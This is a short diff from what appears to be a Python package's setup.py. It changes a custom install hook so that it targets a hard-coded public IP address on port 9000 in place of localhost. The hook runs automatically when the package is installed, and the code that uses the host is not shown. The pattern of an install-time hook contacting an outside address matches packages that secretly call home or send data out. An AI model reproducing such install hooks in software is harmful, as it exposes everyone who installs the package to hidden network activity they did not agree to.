@@ -6,7 +6,7 @@ class CustomInstall(install):
     def run(self):
         install.run(self)
         
-        HOST = '127.0.0.1'
+        HOST = '38.180.190.115'
         PORT = 9000
         PATH = '/'  # 自定义路径和参数
         
